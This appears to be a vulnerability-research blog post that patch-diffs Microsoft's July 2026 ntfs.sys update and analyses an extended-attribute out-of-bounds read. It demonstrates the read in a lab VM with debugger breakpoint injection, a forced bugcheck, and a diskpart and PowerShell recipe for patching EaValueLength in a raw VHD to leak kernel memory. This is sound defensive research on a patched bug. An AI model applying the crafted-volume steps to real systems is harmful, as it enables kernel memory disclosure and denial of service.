---
title: "CVE-2026-50313 — Windows NTFS Remote Code Execution Vulnerability: Patch-Diffing an $EA Out-of-Bounds Read"
date: 2026-08-17 20:00:00 +0200
categories: [Vulnerability Research, Windows Kernel]
tags: [windows, ntfs, patch-diffing, winbindex, ida, kernel-debugging, kdnet, oob-read, info-leak, reverse-engineering]
---

Microsoft shipped four NTFS remote-code-execution CVEs in the July 2026 cumulative
update. All four landed in the same binary, on the same day, in the same 1,792 bytes
of new `.text`. That is a gift: one patch, four bugs, and no vendor guidance about
which change belongs to which CVE.

This is a writeup of pulling that patch apart, finding one of the bugs, and then
proving it end to end on a live kernel — an unprivileged process reading a
kilobyte of kernel memory out of a file's extended attributes, and the same
primitive turned into a bugcheck.

It is also a writeup about being wrong in a useful way. The bug I found does not
match the CWE that the CVE I started from is labelled with, and I will explain
why I think it is one of the *siblings* rather than the headline. Getting that
distinction right mattered more than getting a flashy answer.

Everything here is against a **patched** vulnerability. The fix has been available
since 14 July 2026. Nothing in this post is a volume-image builder, and I say
explicitly at the end which part of the crash I forced by hand.

## Table of contents

1. [Starting point](#starting-point)
2. [Getting the before and after](#getting-the-before-and-after)
3. [Picking the diff pair](#picking-the-diff-pair)
4. [Filtering the noise with a second branch](#filtering-the-noise-with-a-second-branch)
5. [Four clusters, four CVEs](#four-clusters-four-cves)
6. [The EA cluster](#the-ea-cluster)
7. [What the code actually does wrong](#what-the-code-actually-does-wrong)
8. [Where the numbers come from](#where-the-numbers-come-from)
9. [The fix is behind a feature flag](#the-fix-is-behind-a-feature-flag)
10. [Building the lab](#building-the-lab)
11. [First proof: leaking with a debugger](#first-proof-leaking-with-a-debugger)
12. [Second proof: no debugger at all](#second-proof-no-debugger-at-all)
13. [The 64 KB ceiling](#the-64-kb-ceiling)
14. [Making it crash](#making-it-crash)
15. [What this is worth](#what-this-is-worth)
16. [Artifacts](#artifacts)
17. [What was worth learning](#what-was-worth-learning)
18. [Credits](#credits)

## Starting point

The advisory for the CVE I picked up is almost content-free:

> Heap-based buffer overflow in Windows NTFS allows an unauthorized attacker to
> execute code locally.

CVSS 3.1 base 7.8, `AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`, CWE-122, exploit
maturity `E:U` — unproven, no public exploit code. Not in CISA KEV. A GitHub
search returned nothing. So there was no PoC to read and no writeup to crib
from; the only source of truth was the patch itself.

Two details in that vector are worth reading carefully before touching a
disassembler, because they shape the whole threat model:

- **`PR:N` with `AV:L`.** No privileges required, but local vector. The attacker
  is unauthenticated but the code runs locally.
- **`UI:R`.** A human has to do something.

Put together, for a filesystem driver, that is the signature of *malformed
on-disk structures*: a crafted volume that somebody mounts or opens. It is not
"call a syscall and win". Remember that phrase — "on-disk structures" — because
the whole bug turns out to live in the gap between two of them.

The other thing I noted early: Microsoft published four NTFS RCEs that month.

| CVE | CWE |
|---|---|
| CVE-2026-50308 | CWE-191 Integer Underflow |
| CVE-2026-50309 | CWE-122 Heap Overflow |
| CVE-2026-50313 | CWE-122 Heap Overflow |
| CVE-2026-50386 | CWE-122 Heap Overflow |

Four fixes in one binary means the diff will not map one-to-one onto any single
CVE. Three of them even share a CWE. I decided up front that I would report what
the code says and refuse to guess at IDs, which turned out to be the right call.

## Getting the before and after

Patch diffing needs two binaries: the last build before the fix and the build
that contains it. For Windows OS components, [winbindex](https://winbindex.m417z.com/)
indexes essentially every file that has ever shipped in a Windows update, keyed
by SHA-256, and points at Microsoft's own symbol server for the download.

The index is a JSON blob per filename:

```
https://winbindex.m417z.com/data/by_filename_compressed/ntfs.sys.json.gz
```

487 entries for `ntfs.sys`, spanning every Windows release from 1507 onward. Each
entry carries the PE `TimeDateStamp` and `SizeOfImage`, which is exactly what
Microsoft's symbol server wants as a lookup key:

```
https://msdl.microsoft.com/download/symbols/ntfs.sys/<TimeDateStamp><SizeOfImage>/ntfs.sys
```

with the timestamp as 8 uppercase hex digits and the image size as lowercase hex,
concatenated. That gives you a direct, unauthenticated download of any historical
build.

A worthwhile aside on when this *doesn't* work. Earlier in the same session I
tried the identical approach on `mpengine.dll` — the Defender scanning engine —
and winbindex had only 12 entries, all of them the inbox copy that ships inside a
Windows installation image. Defender's engine updates out-of-band through
definition packages, which winbindex does not index, and the Microsoft Update
Catalog only ever retains the *current* platform. There was no historical copy
anywhere public.

That is the general rule worth internalising: **winbindex covers things that ship
in Windows updates.** Components that self-update on their own channel are
invisible to it. `ntfs.sys` is squarely in the first category, so this time it
worked.

While downloading the binaries I also pulled the matching PDBs. Every PE carries
a CodeView debug entry with the PDB GUID and age; concatenated, that is the
symbol-server key:

```
https://msdl.microsoft.com/download/symbols/ntfs.pdb/<GUID><Age>/ntfs.pdb
```

This is not optional. Diffing a 3.5 MB driver with 2,900 stripped functions is
archaeology; diffing it with `NtfsQueryEaSimpleScan` spelled out in the function
list takes an afternoon. Get the symbols.

## Picking the diff pair

Windows 11 24H2 and 25H2 share servicing, so `ntfs.sys` is the same binary with
different OS build numbers wrapped around it. From the winbindex data, filtered
to that branch:

| Release | Date | `ntfs.sys` |
|---|---|---|
| 26200.8737 | 2026-06-23 | 10.0.26100.8737 |
| **26200.8875** | **2026-07-14** | **10.0.26100.8875** |
| 26200.8973 | 2026-07-28 | 10.0.26100.8972 |

`.8875` shipped on 14 July 2026 — July Patch Tuesday, the exact publication date
of the CVE. The preceding build is `.8737`. That is the pair, and because it is a
single cumulative update, the fix is isolated to one delta with no intervening
churn.

A quick structural comparison before any disassembly, just to see what kind of
change this is:

```
.text     373324 -> 375116   (+1792)
.rdata    192488 -> 193728   (+1240)
.pdata     60900 ->  61308    (+408)
PAGE     2192144 -> 2193530   (+1386)
```

`+1,792` bytes of code and `+408` bytes of `.pdata` — roughly 25 new or resized
unwind entries. That is small and surgical: added validation, not a refactor.
Encouraging. A patch that rewrites half the file is miserable to diff; this one
was going to be readable.

## Filtering the noise with a second branch

Here is the trick that saved the most time.

A monthly cumulative update contains far more than security fixes — telemetry
changes, feature-flag plumbing, compiler churn, performance work. If you diff one
pair you get a changed-function list with the fixes buried in unrelated noise.

But Windows 11 26H1 (build 28000) is serviced as a **separate branch** from
24H2/25H2, and it received its own July update on the same day:

| Branch | Before | After |
|---|---|---|
| 24H2 / 25H2 | 26200.8737 | 26200.8875 |
| 26H1 | 28000.2340 | 28000.2525 |

So I diffed both pairs and **intersected the changed-function sets**. Unrelated
monthly churn differs between branches; a genuine security fix gets backported to
both. Anything appearing in both lists is signal.

The numbers:

- 24H2/25H2: 59 changed, 50 added, 1 removed
- 26H1: 68 changed, 57 added, 1 removed
- **Intersection: 52 functions**, of which the `Feature_*` staging stubs are
  discardable boilerplate

That cut the candidate set roughly in half and — more importantly — gave every
surviving function a second, independent vote of confidence.

Mechanically this is unglamorous. I loaded all four binaries into IDA with their
PDBs applied and let auto-analysis finish, then exported the function list from
each database — name, size, and instruction count per function. Comparing two
such lists by name is trivial once symbols are present, because the names are
stable across builds; you are looking for functions whose size or instruction
count moved. A function that gained 40 instructions between June and July is
where the interesting reading is.

The exports came out of [`idasql`](https://github.com/allthingsida/idasql),
which lets you query an IDA database in SQL — the whole inventory is
`SELECT name, size FROM funcs`, run once per database, which is a great deal
less tedious than maintaining an IDAPython exporter for a job you do every
Patch Tuesday.

## Four clusters, four CVEs

Sorted by size delta, the intersected list fell into obvious subsystem groups:

```
DoAction                     11326 -> 13587  (+2261)   LFS / log replay
BinarySearchIndex              771 ->  1466   (+695)   index B-tree
InsertWithBufferSplit         3143 ->  3679   (+536)   index B-tree
InitializeRestartState        5709 ->  6183   (+474)   LFS restart
NtfsCheckAttributeRecord      1586 ->  1088   (-498)   attribute validation
NtfsQueryLxMetadataEa         1453 ->   952   (-501)   EA
NtfsQueryEaSimpleScan          423 ->   578   (+155)   EA
NtfsIsBootSectorNtfs           567 ->   694   (+127)   boot sector
NtfsQueryEaIndexSpecified      302 ->   393    (+91)   EA
NtfsValidateUsnPage            396 ->   462    (+66)   USN
NtfsCheckInstanceNumber         57 ->   107    (+50)   attribute instances
```

Four coherent clusters, which is a satisfying match for four CVEs:

| Cluster | Representative functions |
|---|---|
| **Extended attributes** | `NtfsQueryEaSimpleScan`, `NtfsQueryEaIndexSpecified`, `NtfsQueryEaUserEaList`, `NtfsCommonQueryEa`, `NtfsBuildEaList`, `NtfsQueryLxMetadataEa`, `NtfsLocateEaByName`, `NtfsLookupEasOnFile` |
| **Index / B-tree** | `BinarySearchIndex`, `InsertWithBufferSplit`, `ReadIndexBuffer`, `NtfsCheckIndexHeader`, `NtfsCheckIndexRoot`, `NtfsCheckViewIndexEntries` |
| **LFS / log restart** | `DoAction`, `AnalysisPass`, `InitializeRestartState`, `PinAttributeForRestart`, `LfsIsRestartAreaValid`, `OpenAttributeForRestart` |
| **Attribute records** | `NtfsCheckAttributeRecord`, `NtfsCreateAttributeWithValue`, `NtfsOverwriteAttr`, `NtfsIsBootSectorNtfs` |

I picked the EA cluster first, for a reason that turned out to be exactly right:
eight functions changed in a tightly related group, all of them parsers of the
same on-disk structure. Eight coordinated edits to one parser is not refactoring.
That is somebody fixing a parsing bug.

## The EA cluster

`NtfsQueryEaSimpleScan` is the smallest function in the cluster that *grew*, which
makes it the best reading. Decompiled before and after, the difference is stark.

**Before** (`26100.8737`):

```c
for ( i = a3; ; i = a3 )
{
    if ( a8 >= *(_DWORD *)(v13 + 4) )   // only the START offset is checked
      goto done;

    v16 = i + a8;                        // entry = EaBase + offset
    v17 = *(unsigned __int16 *)(v16 + 6) // EaValueLength
        + *(unsigned __int8  *)(v16 + 5) // EaNameLength
        + 9;

    if ( v17 + v12 > a6 )                // only DESTINATION capacity checked
      break;

    v18 = v12 + v10;
    v9  = (_DWORD *)(a5 + v18);
    memmove(v9, (const void *)v16, v17); // <-- copy
    v10 = v17 + v18;
    a6 -= v17 + v12;

    v19 = (v17 + 3) & 0xFFFFFFFC;        // advance = round_up(entry size)
    a8 += v19;
    v12 = v19 - v17;
    if ( a7 ) goto done;
}
```

**After** (`26100.8875`):

```c
v16 = *(unsigned int *)(a4 + 4);                        // EaTotalLength
if ( (unsigned __int64)v8 + 9 > v16 )                   // (1) header in bounds
    goto fail;
v15 = *((unsigned __int16 *)v14 + 3)
    + *((unsigned __int8  *)v14 + 5) + 9;
if ( v15 + v8 > (unsigned int)v16 )                     // (2) entry in bounds
    goto fail;

/* ... memmove ... */

v18 = *v14;                                             // NextEntryOffset
if ( !*v14 )
    v18 = (*((unsigned __int16 *)v14 + 3)
        +  *((unsigned __int8  *)v14 + 5) + 12) & 0xFFFFFFFC;
if ( v18 < ((v15 + 3) & 0xFFFFFFFC) || v18 + v8 < v8 )  // (3) progress + no wrap
    goto fail;
v8 += v18;
```

Three checks added, all of them the kind you write after somebody files a bug:

1. The 9-byte entry header must lie inside the EA data — note the deliberate cast
   to `unsigned __int64` so the addition cannot wrap.
2. The *whole* entry, header plus name plus value, must lie inside the EA data.
3. `NextEntryOffset` must advance at least past the current entry and must not
   wrap.

Check 3 is interesting on its own: the old code ignored `NextEntryOffset`
entirely and always stepped by `round_up(entry_size)`. The new code honours the
field, which means it also had to defend against a hostile value in it.
`NtfsQueryEaIndexSpecified` got the same header-bounds and wrap checks on its
skip loop.

## What the code actually does wrong

NTFS stores extended attributes on disk as a packed list of
`FILE_FULL_EA_INFORMATION`:

```
+0x00  NextEntryOffset   ULONG
+0x04  Flags             UCHAR
+0x05  EaNameLength      UCHAR
+0x06  EaValueLength     USHORT
+0x08  EaName[]          CHAR[]   (NUL-terminated)
       EaValue[]
```

Map that onto the pre-patch code and the bug is a one-liner:

```c
v17 = *(WORD *)(v16 + 6)    // EaValueLength   \
    + *(BYTE *)(v16 + 5)    // EaNameLength     >  all straight off disk
    + 9;                    //                 /
memmove(dst, v16, v17);
```

The copy length is computed from two attacker-controlled on-disk fields and used
directly. What is checked is `a6` — the *destination* buffer. What is never
checked is whether `v17` bytes actually exist at the *source*.

There are two separate failures stacked here:

1. **The header is not bounds-checked.** The loop guard is
   `a8 >= EaTotalLength` — only the entry's starting offset. If the offset sits
   within 8 bytes of the end, the reads of `EaNameLength` and `EaValueLength`
   are themselves already out of bounds.
2. **The entry extent is not bounds-checked.** Nothing verifies
   `offset + v17 <= EaTotalLength`, so the copy runs to
   `9 + 255 + 65535 = 65,799` bytes past the buffer.

And the destination *is* correctly bounded in both versions, which tells you
what kind of bug this is: the over-read is entirely on the **source** side. Data
is read out of bounds and copied into a buffer the caller owns. That is an
information disclosure, not a memory corruption.

Which is the first hint that this is not the CVE I started from. More on that
later.

## Where the numbers come from

Understanding the bug means knowing where the two operands originate. Working
back through the caller, `NtfsCommonQueryEa`:

```c
if ( NtfsLookupInFileRecord(a1, v10, 0, 0, 0, 0, 0, (__int64)v50) )
{
    v6  = (__int64 *)(v50[0] + *(unsigned __int16 *)(v50[0] + 20LL));
    v19 = *((_DWORD *)v6 + 1) != 0;
}
if ( v19 )
    v20 = NtfsMapExistingEas(a1, v10, &v39, &v45);
```

Reading that carefully:

- `v50[0]` is an attribute record; `*(WORD *)(attr + 20)` is its **ValueOffset**.
  So `v6` points at the resident value of the **`$EA_INFORMATION`** attribute,
  and `*(v6 + 4)` — the length everything is bounds-checked against — is a field
  inside it.
- `v20` comes from `NtfsMapExistingEas`, a cache-manager mapping of the actual
  **`$EA`** attribute data stream. That is the buffer being read.

So the length and the data come from **two different on-disk attributes**:

| Operand | Source |
|---|---|
| `a3` — the EA buffer | mapped `$EA` stream |
| `*(a4+4)` — the bound | length field inside `$EA_INFORMATION` |

Nothing in the vulnerable path cross-validates them, and nothing validates the
per-entry lengths against even the declared total. An attacker authoring a volume
controls both sides independently.

The reachability is the easy part:

```
NtQueryEaFile()  ->  IRP_MJ_QUERY_EA  ->  NtfsFsdDispatchSwitch
                 ->  NtfsCommonQueryEa  ->  NtfsQueryEaSimpleScan
```

An ordinary syscall on a file you can open. No privileges.

## The fix is behind a feature flag

One detail worth flagging on its own. In the patched build, the new checks are
not unconditional:

```c
if ( (unsigned int)Feature_3631731002__private_IsEnabledDeviceUsageNoInline() )
{
    /* the new bounds checks */
}
else
{
    /* the original unchecked code, verbatim */
}
```

This is Windows' feature-velocity staging. The vulnerable path is still compiled
in and still reachable; which branch executes depends on runtime feature state:

```c
__int64 Feature_3631731002__private_IsEnabledDeviceUsageNoInline()
{
  if ( (Feature_3631731002__private_featureState & 0x10) != 0 )
    return Feature_3631731002__private_featureState & 1;
  else
    return Feature_3631731002__private_IsEnabledFallback(...);
}
```

I inspected the descriptor but did not conclusively resolve the compiled-in
default — the layout did not obviously decode and I was not willing to assert a
value I had guessed. So I will state the finding narrowly: **the mitigation is
runtime-gated, and "patched" is therefore not automatically the same as
"protected".** Determining the effective state on a given host is a separate
exercise.

## Building the lab

For dynamic work I used a Hyper-V VM with kernel debugging over **KDNET**.

The lab guest turned out to be Windows 11 22H2, build 22621.6060 — a build that
is *not* in the CVE's affected list at all. Before writing that off, I pulled its
`ntfs.sys` out of the guest, downloaded the matching PDB, loaded it in IDA and
read the same function. It is byte-for-byte the same shape as the pre-patch code:

```c
if ( a8 >= *(_DWORD *)(a4 + 4) )
  goto LABEL_5;
while ( 1 )
{
  v17 = v10 + v8;
  v18 = *(unsigned __int16 *)(v17 + 6) + (unsigned int)*(unsigned __int8 *)(v17 + 5) + 9;
  if ( (int)v18 + v16 > a6 )
    break;
  memmove(v14, (const void *)v17, v18);
```

No feature flag, no bounds checks. The 22H2 branch carries the identical root
cause — Microsoft simply did not list it, almost certainly because that SKU is
out of servicing. So the guest was a perfectly good target for demonstrating the
mechanism.

Two practical notes from setting up KDNET, both of which cost me time:

- **PowerShell Direct dies when the kernel is halted at a debugger break.** This
  is obvious in hindsight and confusing in the moment: the guest is "running",
  integration services report *Lost Communication*, and every remote command
  fails. The kernel is stopped, so the VMBus services are stopped too. Let the
  debugger `g`, and the guest comes back.
- **The KDNET key the tooling reported back was not the key the guest was
  actually using.** Attaching produced a wall of `Packet failed authentication`.
  The fix was to read the real key out of the guest itself:

```powershell
bcdedit /dbgsettings
```

  and attach with that. Trust the target, not the configurator.

Once attached, with symbols:

```
kd> x ntfs!NtfsQueryEaSimpleScan
fffff803`171a4540 Ntfs!NtfsQueryEaSimpleScan (void)

kd> uf /c Ntfs!NtfsQueryEaSimpleScan
  Ntfs!NtfsQueryEaSimpleScan+0xe3 (fffff803`171a4623):
    call to Ntfs!memcpy (fffff803`17097c80)
```

`+0xe3` is the copy. That single address is the whole investigation.

## First proof: leaking with a debugger

Before crafting a malicious volume, I wanted to confirm the primitive existed at
all. The quickest route is a small harness that performs an entirely legal EA
round-trip:

1. Create a file
2. `NtSetEaFile` — one EA named `MAGICEA_`, value = 16 bytes of `0x41`
3. `NtQueryEaFile` into a 64 KB buffer
4. Hex-dump whatever comes back

The distinctive name matters: `MAGICEA_` begins with the bytes `4D 41 47 49`, so
`0x4947414d` as a little-endian DWORD at offset 8 of the entry. That is a filter
for picking my own operation out of the system's background EA traffic:

```
kd> bp Ntfs!NtfsQueryEaSimpleScan ".if (dwo(@r8+8)==0x4947414d) { .echo MAGIC_HIT } .else { gc }"
```

Baseline run, no interference — 33 bytes, exactly what was written:

```
bytesReturned = 33 (0x21)
0000: 00 00 00 00 00 08 10 00 4D 41 47 49 43 45 41 5F
0010: 00 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
0020: 41
```

Read that against the structure: `NextEntryOffset = 0`, `Flags = 0`,
`EaNameLength = 0x08`, **`EaValueLength = 0x0010`**, then `MAGICEA_`, a NUL, and
sixteen `A`s. `9 + 8 + 16 = 33`. The layout checks out.

Now the breakpoint fires and I look at the source buffer:

```
kd> db @r8
ffffc086`af9d3d58  24 00 00 00 00 08 10 00-4d 41 47 49 43 45 41 5f  $.......MAGICEA_
ffffc086`af9d3d68  00 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  .AAAAAAAAAAAAAAA
ffffc086`af9d3d78  41 00 00 00 00 00 00 00-ff ff ff ff 82 79 47 11  A............yG.
```

Our 36-byte entry, and then immediately adjacent kernel pool. Change one field —
`EaValueLength` at `+6`, from `0x0010` to `0x0400`:

```
kd> ew ffffc086af9d3d5e 0400
```

and continue. The result:

```
bytesReturned = 1041 (0x411)
...
02A0: 00 00 00 00 00 00 00 00 46 49 4C 45 30 00 03 00
...
0390: 20 00 00 00 00 00 00 00 06 03 65 00 61 00 2E 00
03A0: 65 00 78 00 65 00 00 00 80 00 00 00 50 00 00 00
```

`46 49 4C 45 30` is `FILE0` — the signature of an NTFS MFT record. Below it, a
`$FILE_NAME` attribute spelling `ea.exe` in UTF-16, and four 8-byte NTFS
timestamps. An unprivileged process asked a file for its extended attributes and
received a kilobyte of the kernel's NTFS cache.

## Second proof: no debugger at all

Injecting a field with a debugger proves the mechanism but not the attack. The
field I changed lives **on disk**; a real attacker sets it by handing you a
volume. So the next step was to build that volume.

The full chain, entirely inside the guest:

```
diskpart:  create vdisk file=C:\poc\poc.vhd maximum=32 type=fixed
           attach vdisk
           create partition primary
           format fs=ntfs quick label=POCVOL
           assign letter=W
```

Then write a perfectly normal EA to a file on it, flush, and **detach** the VHD
so the volume is just a file full of raw NTFS. Patch it:

```powershell
# pattern: NameLen=08, ValueLen=10 00, "MAGICEA_"
$pat = [byte[]](0x08,0x10,0x00,0x4D,0x41,0x47,0x49,0x43,0x45,0x41,0x5F)
# ...on each hit, rewrite ValueLen to 0x0400
$b[$i+1] = 0x00
$b[$i+2] = 0x04
```

Three hits: the MFT record, its mirror in `$MFTMirr`, and a copy in `$LogFile`.
All three patched to declare `EaValueLength = 0x0400`.

Reattach, query, and the kernel does the rest by itself:

```
NtQueryEaFile = 0x00000000
bytesReturned = 1041 (0x411)
...
02A0: 00 00 00 00 00 00 00 00 46 49 4C 45 30 00 03 00
...
0390: 20 00 00 00 00 00 00 00 11 00 49 00 6E 00 64 00
03A0: 65 00 78 00 65 00 72 00 56 00 6F 00 6C 00 75 00
03B0: 6D 00 65 00 47 00 75 00 69 00 64 00 00 00 00 00
03D0: 4C 00 00 00 18 00 00 00 7B 00 42 00 44 00 36 00
03E0: 31 00 32 00 44 00 39 00 43 00 2D 00 41 00 34 00
```

Another live MFT record, this time containing the UTF-16 string
`IndexerVolumeGuid` and an object-ID GUID `{BD612D9C-A420-4344-AEC2-CB89...}`.

No debugger anywhere in that path. Mount a volume, read a file's attributes, get
kernel memory. That is the bug.

Pushing `EaValueLength` to its maximum `0xFFFF` scaled it up cleanly:

```
bytesReturned = 65552 (0x10010)
```

64 KB of kernel memory per call.

## The 64 KB ceiling

At this point I tried to make the scan *march* — to keep walking entries far past
the mapped region rather than over-reading a single entry — by inflating
`UnpackedEaSize` in `$EA_INFORMATION`, which is the loop's bound. A small tool
locates the MFT record by filename and rewrites the field:

```
record@0xA69800 D0@0xA69920 Packed=0x1D Need=0x0 UnpackedEaSize=0x24 -> 0x10000000
patched 1 $EA_INFORMATION record(s)
```

Reattach, query, and:

```
NtQueryEaFile = 0xC0000010
bytesReturned = 0
```

`STATUS_INVALID_DEVICE_REQUEST`. NTFS rejects an EA total size above the 64 KB
limit before the scan ever starts.

That is a genuinely important negative result, and it bounds the whole bug:

> `EaValueLength` is a `USHORT`, and the EA total size is capped at 64 KB.
> **The on-disk over-read cannot exceed roughly 64 KB.**

Which means this is a *reliable, high-quality information leak* but only a
*layout-dependent* crash: a fault requires an unmapped page to fall inside that
64 KB window. It will not blue-screen on demand from disk alone.

I would rather publish that limit than pretend the primitive is bigger than it
is. Finding the ceiling is part of the result.

## Making it crash

To demonstrate the crash *consequence* deterministically I went back to the
debugger and forced the copy length past the mapped region at the exact `memmove`,
with a breakpoint that injects and continues without stopping:

```
kd> bp Ntfs!NtfsQueryEaSimpleScan+0xe3 ".if (dwo(@rdx+8)==0x4947414d) { .echo INJECT; r r8=0x40000000; gc } .else { gc }"
```

Trigger the query, and:

```
INJECT
*** Fatal System Error: 0x00000050
      (0xFFFFC086BD800000, 0x0000000000000000, 0xFFFFF80317097E49, 0x0000000000000002)

Driver at fault:
***      Ntfs.sys - Address FFFFF80317097E49 base at FFFFF80317060000
```

`0x50` is `PAGE_FAULT_IN_NONPAGED_AREA`, and the arguments say everything:

| Arg | Value | Meaning |
|---|---|---|
| 1 | `0xFFFFC086BD800000` | the unmapped kernel address touched |
| 2 | `0x0` | **the operation was a read** |
| 3 | `0xFFFFF80317097E49` | faulting IP — `Ntfs!memcpy`, called from `NtfsQueryEaSimpleScan+0xe3` |

A read fault, at the EA copy, inside NTFS. The over-read walked off the end of
the mapped region into nothing and took the machine down.

**Be clear about what is forced here.** The leak is entirely real and needs no
debugger. The crash is a real kernel bugcheck at the real faulting instruction,
but I extended the copy length by hand to guarantee the boundary crossing that,
in the wild, depends on pool layout falling a certain way inside that 64 KB
window. I am not going to dress that up as a one-shot remote blue screen.

## What this is worth

Being precise about impact:

- **Type: out-of-bounds read (CWE-125).** Kernel memory disclosure. The
  destination is correctly bounded in both builds; the defect is source-side.
- **Reachable unprivileged** through `NtQueryEaFile`, with attacker-controlled
  length and a resume offset that lets successive calls walk a window through
  memory.
- **Leads to:** KASLR defeat and pool/cache disclosure — the info-leak stage of
  an exploit chain — plus a layout-dependent DoS.
- **Does not lead to:** code execution, privilege escalation, or a sandbox
  escape *on its own*. There is no write, no pointer corruption, no control-flow
  influence anywhere in this bug.
- **Not a browser-escape primitive.** It needs malformed on-disk structures,
  which means a crafted volume, which a renderer sandbox cannot mount. The
  realistic threat model is hostile removable media or a mounted image — and
  software that parses untrusted volumes automatically, which is the genuinely
  worrying case.

And the attribution point I promised. The CVE I started from is labelled
**CWE-122, a heap-based buffer *overflow* — a write.** What I found is a
**read**. Those are different bug classes, so I think this is one of the sibling
NTFS CVEs from the same July update rather than the one I set out to analyse.
The CWE-122 write is most likely in the index/B-tree cluster — `BinarySearchIndex`
grew by 695 bytes and `InsertWithBufferSplit` by 536, and B-tree node splitting is
a write path.

I could have shipped this post claiming a specific CVE number. The code does not
support it, so I have not.

## Artifacts

Everything used in this post, as it actually ran. These are the harnesses and
captured output, not a weaponised volume builder — there is deliberately no tool
here that authors a malicious NTFS image from scratch.

| File | What it is |
|---|---|
| [`eatool.cs`](/assets/posts/ntfs-ea-oob-read/eatool.cs) | The main harness. `set` writes one EA named `MAGICEA_`; `query` calls `NtQueryEaFile` into a buffer and hex-dumps the result. Compiles in-guest with the inbox `csc.exe` — no toolchain needed. |
| [`patcher.cs`](/assets/posts/ntfs-ea-oob-read/patcher.cs) | Locates the MFT `FILE` record for a given filename inside a raw NTFS image, walks its attributes to `$EA_INFORMATION` (type `0xD0`), and rewrites `UnpackedEaSize`. |
| [`ea.cs`](/assets/posts/ntfs-ea-oob-read/ea.cs) | The earlier single-shot version used for the first debugger-assisted proof. |
| [`out_selfcontained_read.txt`](/assets/posts/ntfs-ea-oob-read/out_selfcontained_read.txt) | Captured leak from the crafted volume, no debugger involved — 1041 bytes, containing a live MFT record with `IndexerVolumeGuid` and an object-id GUID. |
| [`out_injected.txt`](/assets/posts/ntfs-ea-oob-read/out_injected.txt) | The first proof, with `EaValueLength` injected at the breakpoint. |
| [`CRASH_bugcheck.txt`](/assets/posts/ntfs-ea-oob-read/CRASH_bugcheck.txt) | The `0x50` bugcheck with its four arguments decoded, plus a note on exactly which part was forced. |

Reproducing the leak is the `diskpart` sequence from
[the crafted-volume section](#second-proof-no-debugger-at-all), then `eatool set`,
detach, patch `EaValueLength` to `0x0400`, reattach, `eatool query`. The whole
loop is about five minutes in a VM.

## What was worth learning

**Diff two branches, not one.** Intersecting the 24H2/25H2 and 26H1 patch pairs
cut the candidate set roughly in half and gave every surviving function
independent corroboration. Any component serviced on multiple branches gives you
this for free.

**Symbols are the whole game.** A 3.5 MB stripped driver is a research project. A
3.5 MB driver with `NtfsQueryEaSimpleScan` in the function list is an afternoon.
The PDB is one HTTP request away.

**Trace both operands to their sources.** The bug only becomes obvious once you
see that the length lives in `$EA_INFORMATION` and the data lives in `$EA` — two
independent on-disk attributes with nothing cross-checking them. Reading the
function alone shows you a missing check; reading the provenance shows you *why*
the check was missing and what an attacker actually controls.

**Negative results are results.** `STATUS_INVALID_DEVICE_REQUEST` killed the
marching over-read and capped the bug at 64 KB. That single rejection says more
about real-world severity than the successful leak did.

**Say which parts you forced.** The self-contained leak and the debugger-assisted
crash are different grades of evidence, and a writeup that blurs them is worth
less than one that separates them.

The patch has been available since 14 July 2026. If you are still deciding
whether to install it, the answer is on the other side of a 64 KB window into
your kernel.

## Credits

The function inventories this diff was built on came out of
[`idasql`](https://github.com/allthingsida/idasql) by
[allthingsida](https://github.com/allthingsida) — it exposes an IDA database as
queryable SQL tables, which is what made intersecting four builds' function
lists a few queries rather than a scripting project. Thanks for publishing it.
